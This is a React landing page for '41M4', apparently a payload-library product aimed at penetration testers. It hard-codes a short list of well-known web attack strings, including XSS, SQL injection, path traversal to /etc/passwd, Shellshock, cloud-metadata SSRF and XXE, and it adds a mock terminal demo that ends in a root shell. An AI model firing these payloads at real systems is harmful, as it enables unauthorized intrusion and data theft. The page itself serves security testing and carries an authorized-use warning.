import React, { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Terminal, Shield, Cpu, Activity, Zap, Server, Copy, Check, ChevronRight } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";

const PAYLOADS = [
  { id: 1, type: "XSS", severity: "High", code: `"><script src=data:&comma;alert(1)//` },
  { id: 2, type: "SQLi", severity: "Critical", code: `' UNION SELECT NULL,NULL,NULL--` },
  { id: 3, type: "LFI", severity: "Critical", code: `../../../../../../../../etc/passwd%00` },
  { id: 4, type: "RCE", severity: "Critical", code: `() { :;}; /bin/bash -c "sleep 5"` },
  { id: 5, type: "SSRF", severity: "High", code: `http://169.254.169.254/latest/meta-data/` },
  { id: 6, type: "CSRF", severity: "Medium", code: `<img src="http://target/transfer?to=hacker&amt=1000">` },
  { id: 7, type: "XXE", severity: "High", code: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` },
  { id: 8, type: "WAF Bypass", severity: "High", code: `<sCrIpt>alert(1)</sCrIpT>` },
  { id: 9, type: "CSP Evasion", severity: "Medium", code: `<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>` },
  { id: 10, type: "XSS", severity: "High", code: `<svg/onload=alert(1)>` },
  { id: 11, type: "SQLi", severity: "Critical", code: `admin' OR 1=1--` },
  { id: 12, type: "RCE", severity: "Critical", code: `\`;ls -la;\`` },
];

const CATEGORIES = ["ALL", "XSS", "SQLi", "CSRF", "LFI", "SSRF", "XXE", "RCE", "WAF Bypass", "CSP Evasion"];

export default function Home() {
  const [copiedId, setCopiedId] = useState<number | null>(null);
  const [activeCategory, setActiveCategory] = useState("ALL");
  const [searchQuery, setSearchQuery] = useState("");
  const [heroText, setHeroText] = useState("");
  const [demoText, setDemoText] = useState("");
  
  const fullHeroText = "root@41m4:~$ ./execute_payload --target world";
  const fullDemoText = `root@41m4:~$ nmap -sS -O 192.168.1.1
Starting Nmap 7.92
Host is up (0.0012s latency).
Not shown: 998 closed tcp ports
PORT   STATE SERVICE OS
22/tcp open  ssh     Linux 3.x
80/tcp open  http    Apache httpd

root@41m4:~$ exploit -t 192.168.1.1 -p 80
[+] Initializing payload delivery...
[+] Bypassing WAF rules...
[+] Success! Shell spawned.
$ id
uid=0(root) gid=0(root) groups=0(root)
$ `;

  useEffect(() => {
    let i = 0;
    const interval = setInterval(() => {
      setHeroText(fullHeroText.substring(0, i));
      i++;
      if (i > fullHeroText.length) clearInterval(interval);
    }, 50);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    let i = 0;
    const interval = setInterval(() => {
      setDemoText(fullDemoText.substring(0, i));
      i++;
      if (i > fullDemoText.length) clearInterval(interval);
    }, 20);
    return () => clearInterval(interval);
  }, []);

  const handleCopy = (id: number, code: string) => {
    navigator.clipboard.writeText(code);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filteredPayloads = PAYLOADS.filter(p => {
    const matchesCat = activeCategory === "ALL" || p.type === activeCategory;
    const matchesSearch = p.code.toLowerCase().includes(searchQuery.toLowerCase()) || p.type.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesCat && matchesSearch;
  });

  return (
    <div className="min-h-screen bg-background text-foreground selection:bg-primary selection:text-primary-foreground font-mono">
      {/* Navbar */}
      <nav className="border-b border-border/50 p-4 sticky top-0 bg-background/90 backdrop-blur z-50">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="text-2xl font-bold tracking-widest glitch text-primary" data-testid="logo">
            41M4
          </div>
          <div className="flex gap-4">
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-primary rounded-none" data-testid="link-docs">[DOCS]</Button>
            <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-primary rounded-none" data-testid="link-api">[API]</Button>
            <Button variant="outline" size="sm" className="border-primary text-primary hover:bg-primary hover:text-background rounded-none" data-testid="btn-login">[LOGIN]</Button>
          </div>
        </div>
      </nav>

      {/* Hero */}
      <section className="py-24 px-4 max-w-6xl mx-auto relative">
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-primary/10 via-background to-background pointer-events-none" />
        <div className="relative z-10 text-center space-y-8">
          <h1 className="text-6xl md:text-8xl font-black tracking-tighter mb-4 text-primary" data-testid="hero-title">
            CROSS THE LINE.
          </h1>
          <div className="bg-card border border-border inline-block text-left p-4 rounded-none min-w-[300px] shadow-[0_0_15px_rgba(0,255,65,0.2)]">
            <span className="text-muted-foreground">{heroText}</span><span className="blink">_</span>
          </div>
          <p className="text-xl text-muted-foreground max-w-2xl mx-auto uppercase tracking-wider">
            The elite payload arsenal for authorized security research, penetration testing, and red teaming.
          </p>
          <div className="flex gap-4 justify-center pt-8">
            <Button size="lg" className="bg-primary text-background hover:bg-primary/80 rounded-none text-lg tracking-wider font-bold shadow-[0_0_15px_rgba(0,255,65,0.4)]" data-testid="btn-get-access">
              [ACCESS_ARSENAL]
            </Button>
          </div>
        </div>
      </section>

      {/* Stats */}
      <section className="border-y border-border/50 bg-card/50">
        <div className="max-w-6xl mx-auto grid grid-cols-2 md:grid-cols-4 divide-x divide-border/50 text-center">
          {[
            { label: "PAYLOADS", val: "940+" },
            { label: "CATEGORIES", val: "47" },
            { label: "WAF BYPASSES", val: "12" },
            { label: "POSSIBILITIES", val: "∞" },
          ].map((stat, i) => (
            <div key={i} className="p-6">
              <div className="text-3xl font-bold text-primary mb-1">{stat.val}</div>
              <div className="text-xs text-muted-foreground tracking-widest">{stat.label}</div>
            </div>
          ))}
        </div>
      </section>

      {/* Payload Search */}
      <section className="py-24 px-4 max-w-6xl mx-auto" id="arsenal">
        <div className="space-y-8">
          <div className="flex items-center gap-4 text-primary">
            <Terminal className="w-8 h-8" />
            <h2 className="text-3xl font-bold tracking-widest uppercase">Target_Acquired</h2>
          </div>
          
          <div className="bg-card border border-border p-4 flex flex-col md:flex-row gap-4 items-center terminal-card">
            <span className="text-primary font-bold hidden md:inline">{"search~>"}</span>
            <Input 
              className="bg-transparent border-none focus-visible:ring-0 focus-visible:ring-offset-0 text-primary placeholder:text-muted-foreground text-lg rounded-none" 
              placeholder="Enter search query..." 
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              data-testid="input-search"
            />
          </div>

          <div className="flex flex-wrap gap-2">
            {CATEGORIES.map(cat => (
              <Badge 
                key={cat}
                variant={activeCategory === cat ? "default" : "outline"}
                className={`cursor-pointer rounded-none tracking-wider px-3 py-1 ${activeCategory === cat ? 'bg-primary text-background' : 'border-primary/50 text-primary hover:bg-primary/20'}`}
                onClick={() => setActiveCategory(cat)}
                data-testid={`badge-category-${cat}`}
              >
                {cat}
              </Badge>
            ))}
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {filteredPayloads.map((payload, i) => (
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: i * 0.05 }}
                key={payload.id}
              >
                <Card className="bg-card border-border rounded-none terminal-card h-full flex flex-col group">
                  <CardContent className="p-4 flex-1 flex flex-col">
                    <div className="flex justify-between items-start mb-4">
                      <div className="flex gap-2">
                        <Badge variant="outline" className="rounded-none border-primary/30 text-primary bg-primary/10">{payload.type}</Badge>
                        <Badge variant="outline" className={`rounded-none border-t-0 border-b-0 border-l-4 border-r-0 pl-2 pr-2 
                          ${payload.severity === 'Critical' ? 'border-destructive text-destructive bg-destructive/10' : 
                            payload.severity === 'High' ? 'border-orange-500 text-orange-500 bg-orange-500/10' : 
                            'border-yellow-500 text-yellow-500 bg-yellow-500/10'}`}>
                          {payload.severity}
                        </Badge>
                      </div>
                      <Button 
                        variant="ghost" 
                        size="icon" 
                        className="h-8 w-8 text-muted-foreground hover:text-primary hover:bg-primary/20 rounded-none opacity-0 group-hover:opacity-100 transition-opacity"
                        onClick={() => handleCopy(payload.id, payload.code)}
                        data-testid={`btn-copy-${payload.id}`}
                      >
                        {copiedId === payload.id ? <Check className="h-4 w-4 text-primary" /> : <Copy className="h-4 w-4" />}
                      </Button>
                    </div>
                    <div className="bg-background/50 p-3 flex-1 overflow-x-auto border border-border/30 text-sm whitespace-pre font-mono text-muted-foreground mt-auto">
                      {payload.code}
                    </div>
                  </CardContent>
                </Card>
              </motion.div>
            ))}
            {filteredPayloads.length === 0 && (
              <div className="col-span-1 md:col-span-2 text-center py-12 text-muted-foreground border border-dashed border-border/50">
                NO_PAYLOADS_FOUND
              </div>
            )}
          </div>
        </div>
      </section>

      {/* Features */}
      <section className="bg-card border-y border-border py-24 px-4">
        <div className="max-w-6xl mx-auto">
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
            {[
              { icon: <Activity className="h-8 w-8 text-primary" />, title: "940+ CURATED PAYLOADS", desc: "Hand-picked, battle-tested payloads for every scenario." },
              { icon: <Zap className="h-8 w-8 text-primary" />, title: "INTELLIGENT SEARCH", desc: "Find exactly what you need with lightning-fast fuzzy search." },
              { icon: <Shield className="h-8 w-8 text-primary" />, title: "WAF BYPASS ARSENAL", desc: "Techniques designed to evade modern web application firewalls." },
              { icon: <Cpu className="h-8 w-8 text-primary" />, title: "CSP EVASION", desc: "Advanced vectors to bypass Content Security Policies." },
            ].map((feature, i) => (
              <div key={i} className="space-y-4 p-6 border border-border/30 hover:border-primary/50 transition-colors terminal-card bg-background/50">
                {feature.icon}
                <h3 className="font-bold tracking-widest">{feature.title}</h3>
                <p className="text-muted-foreground text-sm leading-relaxed">{feature.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Terminal Demo */}
      <section className="py-24 px-4 max-w-4xl mx-auto">
        <div className="bg-background border border-primary rounded-none shadow-[0_0_30px_rgba(0,255,65,0.15)] overflow-hidden flex flex-col">
          <div className="bg-primary/20 border-b border-primary p-2 flex items-center gap-2">
            <div className="w-3 h-3 bg-red-500 rounded-none border border-red-700"></div>
            <div className="w-3 h-3 bg-yellow-500 rounded-none border border-yellow-700"></div>
            <div className="w-3 h-3 bg-green-500 rounded-none border border-green-700"></div>
            <div className="ml-4 text-xs font-bold text-primary tracking-widest">root@41m4:~</div>
          </div>
          <div className="p-4 h-64 overflow-y-auto text-sm">
            <pre className="text-muted-foreground font-mono">
              {demoText}<span className="blink text-primary">_</span>
            </pre>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="border-t border-border bg-card py-12 px-4 text-center text-sm">
        <div className="max-w-6xl mx-auto space-y-4 text-muted-foreground">
          <div className="text-xl font-bold tracking-widest text-primary glitch inline-block">41M4</div>
          <p className="uppercase tracking-widest">BY GENESIS PROKEY // <a href="#" className="hover:text-primary underline decoration-primary/30 underline-offset-4">GITHUB</a></p>
          <div className="border border-destructive/30 bg-destructive/5 text-destructive p-4 inline-block mx-auto max-w-2xl text-xs uppercase tracking-wider">
            WARNING: FOR AUTHORIZED SECURITY RESEARCH ONLY. DO NOT USE THESE PAYLOADS AGAINST TARGETS YOU DO NOT HAVE EXPLICIT PERMISSION TO TEST.
          </div>
        </div>
      </footer>
    </div>
  );
}
